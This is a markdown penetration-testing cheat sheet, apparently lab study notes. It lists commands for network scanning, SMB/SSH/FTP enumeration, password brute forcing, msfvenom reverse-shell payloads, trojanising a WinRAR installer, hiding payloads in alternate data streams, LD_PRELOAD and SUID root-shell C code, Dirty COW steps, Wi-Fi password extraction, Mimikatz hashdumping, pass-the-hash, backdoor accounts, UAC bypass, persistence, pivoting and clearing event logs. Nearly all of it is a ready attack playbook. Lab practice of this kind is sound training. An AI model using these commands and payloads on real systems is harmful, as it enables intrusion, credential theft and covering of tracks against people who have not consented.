
## WINDOWS

## LINUX

### [HOST Discovery](#)

**Host Discovery by arp-scan**

- Scan all valid IP addresses on your local networks.
    - `arp-scan -l` / `arp-scan --localnet`
    - `arp-scan -l -I <network interface>` / `arp-scan --localnet --interface=<network interface>`
        - `arp-scan -l -I eth0`
- Scan specific subnet / IP range
    - `arp-scan <subnet>`

**Host Discovery by Netdiscover**
- `sudo netdiscover -r 192.168.204.0/24` 

**Host Discovery by NMAP**

- No Port scan (Ping Sweep, -sn/sP) 
        - -sn can be combined with -p* options

    - When Privileged user uses for local network - ARP request are used
            - `sudo nmap -PR -sn TARGETS` (-PR indicates that you only want an ARP scan)

    - When Privileged user uses for outside local network - {ICMP echo requests, ICMP timestamp requests, TCP SYN (Synchronize) to port 443, TCP ACK (Acknowledge) to port 80 } are used
        - by ARP Scan
            - `sudo nmap -PR -sn TARGETS` (-PR indicates that you only want an ARP scan)
        - by ICMP echo Scan
            - `sudo nmap -PE -sn 10.10.68.220/24` (To use ICMP echo request to discover live hosts, add the option -PE)
        - by ICMP Timestamp 
            - `sudo nmap -PP -sn 10.10.68.220/24`
        - by ICMP Address mask scan
            -  `sudo nmap -PM -sn 10.10.68.220/24`
        - by TCP SYN Scan (SYN ->, <- SYN/ACK, -> RST)
            - `sudo nmap -PS -sn 10.10.68.220/24`
        - by TCP ACK scan (ACK -> and ACK ->, <- RST)
            -  `sudo nmap 192.168.29.0/24 -sn -n -PA`

    - When Unprivileged user uses - 3 way handhsake happens by sending SYN packets
        
        - by TCP SYN Scan (SYN ->, <- SYN/ACK, -> ACK)
            - `nmap -sn 10.10.68.220/24`
            - `nmap -sn 208.109.192.1-255`
            - `nmap -sn 208.109.192.*`
            - `nmap -sP 208.109.*.*`
            - `nmap -sn 208.109.193.* --exclude 208.109.193.5` 
            - `nmap -sn 192.168.46.0/24`


### [Port and Service Scanning](#)

- Normal scan
    - `nmap <ip>` / `nmap -p <port> <ip>` / `nmap -p- <ip>` / `nmap --top-ports n <ip>`
- TCP SYN Stealth Scan 
    - `nmap -sS <ip>` , `nmap -sS <subnet>` (SYN Scan)
- No Ping Scan for windows (treat all host online and skip host discovery)
    - `nmap -Pn <ip>` , `nmap -Pn <subnet>`
- NULL Scan (does not even include SYN,ACK)
    - `nmap -sN <ip>`
- Using public dns
    - `nmap --dns-servers 8.8.4.4,8.8.8.8 -sL <ip>`
- UDP Scan
    - `nmap -sU <ip>`

- Service, Verion Scanning
    - Normal service version scan
        - `nmap -sV <ip>` / `nmap -sV -p`

- Tracing newtwork packet
    - `nmap -vv -n -A -T4 -Pn --packet-trace 192.168.29.193`

- Agrssive Scans
    - NMAP
        - `nmap -A -T4 <ip>`
        - `nmap -A -<ip>`

**General Web Enumeration**

- DNS Enumeration
    - `host`, `dig`, `DNSRecon`(python tool)

- Publically available information
    - `whois`
    - `robots.txt`, `sitemap/xml`
    - `Google Dorks`

- Website techstack enumeration
    - `whatweb`

- Firewall Detection
    - `wafw00f  http://192.49.74.3/webdav/`

- Subdomain Enumeration
    - `sublist3r` (python tool)

- Web Directory Enumeration
    - `nmap 192.245.191.3 --script http-enum`
    - `dirb http://192.245.191.3/ -r`
    - `dirb http://192.102.102.3 /usr/share/metasploit-framework/data/wordlists/directory.txt `
    - ``
    - `use auxiliary/scanner/http/brute_dirs` / `use auxiliary/scanner/http/dir_scanner`

**HTTP Enumeration**

- Server Banner and version
    - `use auxiliary/scanner/http/http_version`
    - `curl 192.102.102.3 | more`
    - `browsh --startup-url 192.102.102.3`
    - `lynx http://192.102.102.3`

- WebDav Enumeration
    - Http methods supported by /webdav
        - `nmap -p 80 -sV 10.5.17.75 --script http-methods --script-args http-methods.url-path=/webdav/`
    - Webdav scan
        - `nmap -p 80 -sV 10.5.17.75 --script http-webdav-scan --script-args http-methods.url-path=/webdav/`
    - Checking files that can be uploaded
        - `davtest -auth bob:password_123321 -url http://10.5.27.32`

**SMB Enumeration**

- SMB version
    - `nmap --script smb-protocols 10.5.16.60 -p 445 `
- SMB security (user/share level suthentication,message signing, challange response,account lockout, password policy)
    - `nmap --script smb-security-mode 10.5.16.60 -p 445 `
    - `nmap --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
- SMB active sessions
    - `nmap --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.5.21.157 -p 445`
- SMB network shares
    - `nmap -p445 --script smb-enum-shares 10.5.21.157`
    - `nmap --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
- SMB network shares files
    - `nmap --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.31.241`
- SMB users
    - `nmap --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
- SMB groups
    - `nmap --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
- SMB statistics (failed logins. errors etc..)
    - `nmap --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`

**SAMBA Enumeration**

- Samba enumeration (all possible things)
    - `enum4linux -e 10.10.18.135`

- Samba version, workgroup name, 
    - `nmap 192.213.18.3 -sV -p 445`
    - `nmap --top-port 25 -sU --open 192.213.18.3 -sV`
    - `use auxiliary/scanner/smb/smb_version`
- Samba OS discovery, Netbios name,  computer name
    - `nmap -p 445 192.213.18.3 --script smb-os-discovery`
    - `rpcclient -U "" -N 192.230.148.3` > `srvinfo`
    - `enum4linux -O 192.54.223.3 -p 445`
    - `nmblookup -A 192.221.150.3`
- Samba Anonymous connection
    - `smbclient -L 192.221.150.3`
    - `rpcclient -U "" -N 192.230.148.3`
- Samba accessing shares by connection
    - `smbclient //192.120.159.3/public - N`
    - `smbclient //192.241.81.3/admin -U admin` 
    - `smbclient //192.180.12.3/shawn -U admin` > `?`
- Samaba listing users
    - `nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.157.202.3`
    - `use auxiliary/scanner/smb/smb_enumusers`
    - `enum4linux -U 192.54.223.3 -p 445`
    - `rpcclient -U "" -N 192.54.223.3` >`enumdomusers` 
- Samba finding SID of admin
    - `rpcclient -U "" -N 192.54.223.3` > `lookupnames admin`
    - `enum4linux -r -u "admin" -p "password1" 192.241.81.3`
- Samba finding domain groups
    - `enum4linux -G  192.120.159.3`
    - `rpcclient -U "" -N 192.120.159.3` > `enumdomgroups`
- Samba listing shares and thrier permissions
    - `nmap --script smb-enum-shares -script-args smbusername=admin,smbpassword=password1 192.54.233.3`
    - `smbclient -L 192.221.150.3`
    - `smbmap -u guest -p "" -d .  -H 10.5.26.125`
    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125`
    - `enum4linux -S  192.120.159.3`
    - `use auxiliary/scanner/smb/smb_enumshares`
- Samba listing content of shared drive
    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'`
    - `smbclient //192.120.159.3/public - N` > `ls`
- Samba uploading file to network share
    - `smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.5.24.17`
- Samba downloaing file from network share
    - `smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.5.24.17`
- Samba remote code execution
    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'`
- Samba pipes available
    - `use auxiliary/scanner/smb/pipe_auditor`
- Samba printer configuration
    - `enum4linux -I  192.120.159.3`


**FTP Enumeration**

- FTP Version - `nmap 192.60.4.3 -sV -p 21`
- FTP Anonymous login - `nmap 192.176.71.3 -p 21 --script ftp-anon`
- FTP connection - `ftp 192.60.4.3 `

**SSH Enumeration**

- OpenSSH version 
    - `nmap 192.238.103.3 -p 22 -sV -O`
    - `nc 192.238.103.3 22`
- Checking if Authentication is required and Type of Authentication supported
    - `nmap 192.238.103.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"`
- Encryption Algorithm for key supported by SSH server
    - `nmap 192.238.103.3 -p 22 --script ssh2-enum-algos`
- Checking ssh-hostkey ie the public key on server
    - `nmap 192.238.103.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`



### [Brute Forcing](#)

- Hydra
    - `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.5.21.117 http-get /webdav/`
    - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.60.4.3 ftp`
    - `hydra -l student -P /usr/share/wordlists/rockyou.txt 192.72.183.3 ssh`
    - `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.241.81.3 smb`
    - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.5.31.78 rdp -s 3333`

- Nmap
    - `nmap 192.245.191.3 -p 80 --script http-brute --script-args http-brute.path=/secure/` / `nmap 192.245.191.3 -p 80 --script http-brute --script-args http-brute.path=/webdav/` / `nmap 192.245.191.3 -p 80 --script http-brute --script-args http-brute.path=/secure/`
    - `nmap 192.60.4.3 --script ftp-brute --script-args userdb=/users -p 21`
    - `nmap 192.72.183.3 -p 22 --script ssh-brute --script-args userdb=/root/user`

- Crackmapexec
    - `crackmapexec winrm 10.5.16.53 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` 
    - `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "whoami"` / `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "systeminfo"`
    - Pass the hash using crackmapexec
        - `crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d`
    - Remote code Execution using crackmapexec
        - `crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "ipconfig"`


- Metasploit
    - `use auxiliary/scanner/ssh/ssh_login`
    - `use auxiliary/scanner/smb/smb_login`
    - `use auxiliary/scanner/smb/http_login`
    - `use auxiliary/scanner/smb/ftp_login`






### [Payloads, listeners, encoders and getting shells](#)

**Payloads**

- Msfvenom
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.12.2 LPORT=1234 -f asp > shell.asp`
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe`
    - `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > mybinary`
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.19.5 LPORT=1234 -f exe > backdoor.exe`

- x86/shikata_ga_nai 
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -f exe > payload.exe`

- Command shell using ruby script
    - `evil-winrm.rb -u administrator -p tinkerbell -i 10.5.27.211`

- Manual Payloads

    - `mv 40839.c dirtcowexploit.c` >`python -m http.server 80` > `wget http://10.17.107.227/dirtcowexploit.c -P /tmp/` > `cd /tmp` > `gcc dirtcowexploit.c -pthread -o dirty -lcrypt` > `./dirty` > `su firefart`

    - `mv 37292.c exploit.c` > `python -m http.server 80`  > `wget http://10.17.107.227/exploit.c -P /tmp/` > `cd tmp` > `gcc exploit.c -o exploit` > `./exploit`

    - `nano exploit.c`
        ```
        #include <stdio.h>
        #include <stdlib.h>
        #include <sys/types.h>
        void _init() {
            unsetenv("LD_PRELOAD");
            setuid(0);
            setgid(0);
            system("/bin/bash -p");
            }   
        ```
        -  `gcc -fPIC -shared -nostartfiles -o ./libncursesw.so.6 ./exploit.c` > `sudo LD_PRELOAD=./libncursesw.so.6 nano`

        -  `gcc -fPIC -shared -nostartfiles -o ./libncursesw.so.6 ./exploit.c` > `sudo LD_PRELOAD=./libncursesw.so.6 nano`

    - `nano /tmp/preload.c`
        ```
        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
                unsetenv("LD_PRELOAD");
                setresuid(0,0,0);
                system("/bin/bash -p");
        }

        ```
        - `gcc -shared -fPIC -nostartfiles -o /tmp/preload.so /tmp/preload.c` > `sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2`

    - `ldd /usr/sbin/apache2` > `nano /home/user/tools/sudo/library_path.c`
        ```
        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
                unsetenv("LD_LIBRARY_PATH");
                setresuid(0,0,0);
                system("/bin/bash -p");
        }
        ```
        - `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c` > `sudo LD_LIBRARY_PATH=/tmp apache2`

    - `echo $PATH` > `export PATH=/tmp:$PATH` > `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c` > `gcc /tmp/service.c -o /tmp/service` > `/usr/local/bin/suid-env`

    `nano nfc.c`  
        ```
        #include<unistd.h>
        void main (){
        setuid(0);
        setgid(0);
        system("/bin/bash");
        }
        ```
    - Complie the code to create executable and give SUID permission
        - `gcc nfc.c -o nfs` > `chmod u+s nfs`


**Listeners**

- Metasploit 
    - Mulit/handler
        - `use multi/handler` > `set payload windows/meterpreter/reverse_tcp` > `set LHOST 10.10.12.2` >  `set LPORT 1234` > `run`

**Injection of payload in executables**

- Injection of payload in executables using `msfvenom`

    - Injecting payload in winrar.exe
        - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/winrar-x32-624.exe > ~/Downloads/winrar.exe`
        - with actual behaviour
            - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.204.130 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/winrar-x32-624.exe > winrar.exe`

- Injection of payload in `Resource Stream` of a legitimate file
    - copy payload to /temp folder
        - `cd /`  > `mkdir temp ` > `copy c:\Users\Lenovo\Desktop\Payload.exe c:\temp `
    - Using `type` command and hide our payload output into the resource stream of a legitimate file
        - `type Payload.exe > windowslogs.txt:mypayload.exe` 
    - Enter legitimate data in windowslosgs.txt and also delete the payload.exe to stay hidden
        - `notepad windowslogs.txt `
        - `del Payload.exe ` 

### [Payload Transfer Techniques](#)

- Using Netcat
    - We need to have netcat listerner on target machine with `>` so whatever werecieve get stored in `'test.txt`
        - `nc.exe -nlvp 1234 > test.txt`
    - Sned file from your machine
        - `nc -nv 10.5.19.93 1234 < test.txt`
        
- HTTP Server on kali
    - `service apache2 start`
    - `python -m SimpleHTTPServer 80`
    - `python -m http.server 80 `
    - Fetching file
        - `certutil -urlcache -f http://10.10.19.3/payload.exe payload.exe`
        - `wget http://10.17.107.227/exploit.c -P /tmp/`

- FTP Server on kali
    - `python -m pyftpdlib -p 21`
    - Fetching file
        - `get <filname>`

- SMB Server on kali
    - `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .  ` 
    - Fetching file
        - `copy \\10.17.107.227\kali\reverse.exe C:\PrivEsc\reverse.exe`
### [Exploitation](#)

**HTTP Exploitation**   
- Connectiing to site
    - `curl http://192.245.191.3/webdav/ --user "admin:angels"` / `curl http://192.245.191.3/secure/ --user "admin:brittany"`
- Connecting Webdav
    - `davtest -auth admin:angels -url http://192.245.191.3/webdav/`
    
- Uploading files
    - `curl http://192.49.74.3/webdav/ --user "admin:angels" --upload-file /root/backdoor.asp`
- Downloading files

- Uploading/Downloading/Deleting files to /Webdav
    - `cadaver http://10.5.27.32/webdav`
        - `put /usr/share/webshells/asp/webshell.asp `
        - `delete webshell.asp`

- Uploading files using Metasploit
    - `use exploit/windows/iis/iis_webdav_upload_asp` > `set RHOSTS 10.5.26.116` > `set PATH /webdav/newshell.asp` > `set httpUsername bob` > `set httppassword password_123321` > `set LHOST 10.10.12.2` >  `set LPORT 1234` > `exploit`

**FTP Exploitation**

- FTP connection - `ftp 192.60.4.3 `
- Uploading and Downloading files
    - ftp> `get secret.txt`

**SSH Exploitation**

- SSH connection 
    - `ssh root@192.238.103.3`
    - `ssh 192.168.204.134 -okexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc`
    - `ssh -i ssh-key user@192.168.204.132 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`


**SAMBA Exploitation**

- Samba listing users
    - `nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.157.202.3`
    - `use auxiliary/scanner/smb/smb_enumusers`
    - `enum4linux -U 192.54.223.3 -p 445`
    - `rpcclient -U "" -N 192.54.223.3` >`enumdomusers` 
- Samba accessing shares by connection
    - `smbclient //192.120.159.3/public - N`
    - `smbclient //192.241.81.3/admin -U admin` 
    - `smbclient //192.180.12.3/shawn -U admin` > `?`
- Samba listing shares and thrier permissions
    - `nmap --script smb-enum-shares -script-args smbusername=admin,smbpassword=password1 192.54.233.3`
    - `smbclient -L 192.221.150.3`
    - `smbmap -u guest -p "" -d .  -H 10.5.26.125`
    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125`
    - `enum4linux -S  192.120.159.3`
    - `use auxiliary/scanner/smb/smb_enumshares`
- Samba listing content of shared drive
    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'`
    - `smbclient //192.120.159.3/public - N` > `ls`
- Samba uploading file to network share
    - `smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.5.24.17`
- Samba downloaing file from network share
    - `smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.5.24.17`
- Samba remote code execution
    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'`
- Samba pipes available
    - `use auxiliary/scanner/smb/pipe_auditor`
- Samba finding SID of admin
    - `rpcclient -U "" -N 192.54.223.3` > `lookupnames admin`
    - `enum4linux -r -u "admin" -p "password1" 192.241.81.3`
- Exploiting Using Metasploit
    - `use exploit/linux/samba/is_known_pipename `

**SMB Exploitation**

- Exploiting `EternalBlue` vulnerabibility in SMBv1
    - `use auxiliary/scanner/smb/smb_ms17_010`

- Exploiting Security misconsifugration *Message signing enabled but not required* by `PSExec`
    - First finding credentials by brute forcing
        - `scanner/smb/smb_login` / `hydra` / any other
    - Exploiting flaw using metasploit `PsExec` module
        - `use exploit/windows/smb/psexec` > `set RHOSTS 10.5.22.249` > `set LHOST 10.10.26.2` > `set SMBUSER administrator` > `set SMBPASS qwertyuiop` > `set LPORT 1234` > `exploit`

**RDP Exploitation**

- Connecting RDP
    - `xfreerdp /u:administrator /p:qwertyuiop /v:10.5.31.78:3333`

**WinRM Exploitation**

- Arbitiary command execution
    - `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "whoami"` / `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "systeminfo"`

- Getting Command shell
    - `evil-winrm.rb -u administrator -p tinkerbell -i 10.5.27.211`
    - `use windows/winrm/winrm_script_exec` > `set RHOSTS 10.5.27.211` > `set RPORT 5985` > `set USERNAME administrator` > `set PASSWORD tinkerbell` > `set FORCE_VBS true` > `exploit`

### [Windows Post Exploitation Enumeration](#)

**Operating System Enumeration**

- OS Name and Version
    - `systeminfo | findstr "OS"`

- System Architecture
    - `echo %PROCESSOR_ARCHITECTURE% `

        - This info is useful for kernel exploits

**Users and Permissions**

- List users and their permissions
    - `net users`
    - `net users <username>`

- Get SIDs
    - `whoami /user`
    - `wmic useraccount get name,sid`

- Get Privileges
    - `whoami /priv`

**Network info enumeration**

- Available network interfaces
    - `ipconfig / all`

- Routing Table
    - `route print`

- ARP (Address Resolution Protocol) cache table for all available interfaces.
    - `arp -A`

- Active network connections 
    - `netstat -ano`

- Firewall rules
    - `netsh firewall show state`
    - `netsh firewall show config` 
        - use `netsh firewall ?`  for more options

- Wifi info

    - List saved Wifi
        - `netsh wlan show profile`

    - To get the clear-text password use
        - `netsh wlan show profile <SSID> key=clear`

    - Oneliner to extract all wifi passwords
        - `cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*`

**Services Enumeration**

- Scheduled Tasks (scheduled bydefult and by task schedular)
    - `schtask`
        - `schtasks /query /fo LIST /v`

- Processes running
    - `tasklist /SVC`

- Started services
    - `net start`
    - `sc query`
        - `sc qc <service_name>`

**Information Enumeration**

- Find files
    - `where /r c:\windows todo.txt`
    - `where /r c:\ flag.txt`
    - `where /r c:\windows ntoskrnl.exe`

- File names containing certain keywords.   
    - `dir /s *pass* == *cred* == *vnc* == *.config*`
    - `findstr /si password *.xml *.ini *.txt`

- Grep the registry for keywords, in this case "password".
    - `reg query HKLM /f password /t REG_SZ /s`
    - `reg query HKCU /f password /t REG_SZ /s`

- Installed Drivers
    - `DRIVERQUERY`
        - `DRIVERQUERY | findstr "<your search>`

- Shares
    - Get a list of computers `net view`
    - Check current shares `net shares`
    - List shares of a computer `net view \\computer /ALL`
    - Mount the share locally `net use x: \\computer\share`

- known computers hardcoded on the hosts file
    - `type C:\Windows\System32\drivers\etc\hosts`

- Currently stored credentials
    - `cmdkey /list`

### [Meterpreter](#)

- Windows Enumeration
    - `sysinfo`, `getuid`, `getpid`, `getprivs`, `ps`, `pgrep <process_name>`, `shell`

- Migrating to other process
    - `ps` > `pgrep <process name>` > `migrate <pid>`

- Checking current privileges
    - `getprivs`

- Windows Privilege Escalation
    - `getsystem`

- Starting shell on system
    - `shell`

- Keylogging
    - `keyscan_start`, `keyscan_dump`

- Adding route to other network for pivoting
    - `run autoroute -s <subnet>/20`

- Portforwarding
    - `portfwd add -l 1234 -p 80 -r 10.5.31.52`

- Hashdumping 
    - Using Mimikatz meterpreter extension
        - `pgrep lsass` > `migrate 788` > `load kiwi` > `creds_all` > `lsa_dump_sam`
    - Using Hashdump
        - `hashdump`

- Create a Backdoor user, enable rdp for it, also hide it from login screen and add it to Remote Desktop Users and Administrators groups
    - `run getgui -e -u user123 -p hacker_123321`

- Clear windows Event Log
    - `clearev`

NOTE - There is more advanced need to be checked from 
https://fuzzysecurity.com/tutorials/16.html, 
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#internet-settings

### [Windows Privilege Escalation](#)

**Privilege Escalation by Kernel Exploits**

- Finding Kernel exploit by using `Exploit Suggestor` on metasploit
    - `search exploit_suggest` > `multi/recon/local_exploit_suggester` > `set SESSION 1` > `exploit`

**Privilege Escalation by Bypassing UAC prompt**

- Checking if user is part of Local Group Administrator
    - `net localgroup administrator`

- Bypassing UAC using metasploit module
    - `use exploit/windows/local/bypassuac_injection ` > `set payload windows/x64/meterpreter/reverse_tcp` > `set SESSION 1` > `set LPORT 1234` >  `set TARGET Windows\ x64 ` > `exploit`
        - This module just disabled UAC, hence we still need to elevate privileges using `getsystem`
        - `getsystem` > `getuid` > `hashdump`

- Bypassing UCA using tool - UACme
    - Creating meterpreter revershe shell Payload and uploading it (in this case uploading using meterpreter session)
        - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.19.5 LPORT=1234 -f exe > backdoor.exe` 
        - `cd C://` > `mkdir temp` > `cd temp` > `upload backdoor.exe`
    - Uploading the UAC executable `Akagai64.exe`
        - `upload /root/Desktop/tools/UACME/Akagi64.exe`
    - Starting listerner on our machine
        - `use multi/handler` > `set payload windows/meterpreter/reverse_tcp` > `set LPORT 1234` > `set LHOST 10.10.19.5` > `run`
    - Executing executable 
        - `.\Akagi64 23 C:\temp\backdoor.exe`

**Privilege Escalation by Windows Access Tokens**
    
- Token Impersonation using Meterpreter Incognito module

    - `load incognito` > `list_tokens -u` > `impersonate_token "ATTACKDEFENSE\Administrator"`
        - In this we impersonate existing token

- Patato attack
    - this attack generates access token for you, instead of impersonating

### [Pivoting](#)

**Pivoting by Port forwarding (using metasploit)**

- Identify the Network interfaces
    - `ipconfig`
- Add route to your current subnet to access other network available
    - `run autoroute -s 10.5.26.0/20`
        - With this we actually addedd route to our msfconsole, now we can access any device from this msfconsole
    - we can also list routes
        - `run autoroute -p`
            - Addiing route wont allow you to execute anythin other than metasloit modules,  so its not like we can do nmap scan on victim 2 just by adding route, but instead we can user modules like portscan etc
- Port scanning on other network IP within same subnet (we already have IP in this case)
    - `search portscan` > `use auxiliary/scanner/portscan/tcp` > `set RHOSTS 10.5.31.52` > `set PORTS 1-100` > `exploit`
        - We observe that we have port 80 open on victim 2, but we still cant access it directly (not by any way)
    - To perform a Nmap scan we will need to Forward port 80 on victim 2 to a port on our local host which is the kali linux instance.
- Port Forwarding
    - `portfwd add -l 1234 -p 80 -r 10.5.31.52`
        - Now we can do nmap scan by specifying port 1234 and kali linux ip/localhost which will eventually do nmap scan for port 80 of victim 2 machine
- Scanning port 80 on victim2 by using port 1234 on our kali
    - `db_nmap -p 1234 -sS -sV localhost`
- Further we can exploit if service running is vulnerable
    - `use windows/http/badblue_passthru` > `set payload windows/meterpreter/bind_tcp` > `set payload windows/meterpreter/bind_tcp` > `set payload windows/meterpreter/bind_tcp` > `set LPORT 4433` > `exploit`


### [Clearing Tracks](#)

**Clearing artifacts using metasploit `Resource Scripts`**
```
msf6 exploit(windows/local/persistence_service) > `run`
[*] Started reverse TCP handler on 10.10.26.2:4444 
[*] Running module against ATTACKDEFENSE
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\vgdjb.exe
[*] Creating service spMjX
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc
[*] Sending stage (175174 bytes) to 10.5.31.225
[*] Meterpreter session 2 opened (10.10.26.2:4444 -> 10.5.31.225:49743) at 2024-01-15 17:34:43 +0530  
```
- We can delete the artificats created by metasploit module by Resource Scripts provided by it
    - `resource /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc`

**Clearing Windows Event Logs usng meterpreter**
- `clearev`

### [Windows Persistence](#)

**Establist Persistence**

- Establist Persistence using metasploit module
    - `use exploit/windows/local/persistence_service` > `set payload windows/meterpreter/reverse_tcp` > `set SESSION 1` > `run`
    - Get back access to target by specifying same LHOST and LPORT
        - `use multi/handler` > `set payload windows/meterpreter/reverse_tcp` > `set LHOST 10.10.12.2` > `exploit`

- Establish Persistence by Enabling RDP by metasploit module
    - `use windows/manage/enable_rdp` > ` set SESSION 1` > `exploit`
        - we need to get access to RDP, for wchich we require credentials
            - we can change user password (not recommended)
                - `shell` > `net user Administrator password_123`
                - `xfreerdp /u:administrator /p:password_123 /v:10.5.28.9`
            - we will create a New backdoor user Account and we have the permission to do so as we are administrator, We will then also hider user from windows login screen, we then add the user to gruops Remote Desktop Users and Administrators
                - We can do all of this by a meterpreter command `getgui`
                - `run getgui -e -u user123 -p hacker_123321`

**Pass The Hash**

- Pass The Hash Attack using `PsExec` module of metasploit
    - Get the hash (both NTLM and LM hash required)
        - `hasdump` / `kiwi`/ Mimikatz executable
    - Use module
        - `use exploit/windows/smb/psexec ` > `set LPORT 1234` > `set RHOSTS 10.5.20.134` > `set SMBuser Administrator` > `set SMBPASS aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d` > `exploit`

- Pass The Hash using `crackmapexec`
    - Get the hash (only NTLM hash is required)
        - `hasdump` / `kiwi`/ Mimikatz executable
    - Use tool
        - `crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d`
        - Remote code execution using crackmapexec
            - `crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "ipconfig"`

### [Metasploit](#)

- Starting / Troubleshooting DB
    - `sudo service postgresql start`
    - `sudo msfdb init`
    - `sudo msfconsole` > `db_status`
- Brute forcing
    - `use auxiliary/scanner/ssh/ssh_login`
    - `use auxiliary/scanner/smb/smb_login`

- Searching auxiliary/scanner/*
    - `search auxiliary/scanner/ssh`
    - `use auxiliary/scanner/smb/smb_version`
    - `use auxiliary/scanner/smb/smb2`
    - `use auxiliary/scanner/smb/smb_enumusers`
    - `use auxiliary/scanner/smb/smb_enumshares`
    - `use auxiliary/scanner/smb/pipe_auditor`
- Switching shell to meterpreter session
    - `use post/multi/manage/shell_to_meterpreter`
    - `sessions -u 1`

- Post Exploit Enumeration
    - `sysinfo`
    - `getuid`



### [Linux Post Exploit Enumeration](#)

**Break out of Jail shell first**
    - `/bin/bash -i`
    - `echo os.system('/bin/bash')`
    - `python -c 'import pty;pty.spwan("/bin/bash")`
**Operating System Enumeration**

- Kernel version and System architecture
    - `unmae -r`, `uname -a`
    - `cat /proc/version`
        - Check if kernel exploit exist
- Linux Distribution type and its version
    - `cat /etc/issue`

**Users and Permissions Enumeration**

- Users looged in, Users last logged in
    - `id`, `who`, `whoami`, `w`, `last`
- History of user activity
    - `cat ~/.bash_history`
- List of users
    - `cat /etc/passwd`
- Sudo permissions, 
    - `sudo -l`
        - check each binary properly
- Permissions for sensetive files
    - `cat /etc/sudoers`
    - `cat /etc/shadow`
        - check if you have write access
- Interesting files in home directories if any
    - `ls -ahlR /home`
- Permission for sensetive directories
    - `ls -ahlR /root/`
- Writable directories for user
    - `find / -type d -writable 2>/dev/null` / `find / -type d -perm -222 2>/dev/null` / `find / -perm -o+w -type d 2>/dev/null `
        - this can be used to keep our payloads
- Writable files for user
    - `find / -perm -o+w -type f -ls 2>/dev/null`
- Writable Config files in /etc 
